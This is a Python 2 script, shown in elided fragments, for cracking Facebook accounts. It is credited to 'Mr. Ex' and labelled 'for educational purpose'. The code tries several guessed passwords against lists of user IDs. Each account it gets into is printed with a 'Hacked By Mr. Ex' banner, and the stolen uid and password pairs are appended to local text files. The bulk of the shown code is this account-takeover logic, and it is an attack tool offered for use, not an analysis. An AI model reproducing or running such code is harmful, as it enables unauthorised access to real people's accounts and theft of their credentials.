#Script Given By Mr. Ex
#Script Is Given For Educational Purpose
#Script Edited By Mr. Ex
#Utf-8 python 
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://facebook.com/noyonvau14')
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
        os.system('xdg-open https://facebook.com/mr.3x2')
        main()
    else:
        print ''
...
def login():
    try:
        ...
        print ' \x1b[1;96m [2] LOGIN WITH TOKEN [BEST METHOD]\n'
...
def crack():
    ...
    print logo
    print ''
    print '\x1b[1;0m 1. \033[1;96mClone 3 Links\033[0m \n 2. \033[1;96mClone Single id\033[0m' ##Thanks Mr. Ex
    print ''
    crack_select()
...
def crack_select():
    ...
    print ' \x1b[1;94m  Wait Ids Will Appear Here \033[0m'#Thanks Mr. Ex
    print 45 * '_'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[Hacked By Mr. Ex]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('mr.exokids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;31m[Fucked By Mr. Ex] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('mr.excpids.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;32m[Hacked By Mr. Ex]\033[0m ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('mr.exokids.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;31m[Fucked By Mr. Ex] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('mr.excpids.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[Hacked By Mr. Ex]\033[0m ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('mr.exokids.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;31m[Mr.Ex-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks Mr. Ex
                        cp = open('mr.excpids.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
    ...
    print '   \x1b[0m Total Ok / Cp ids : ' + str(len(oks)) + '/' + str(len(cps)) ##Thanks Mr. Ex
    print 45 * '\033[0m_\033[0m'
    print ''
    print ''
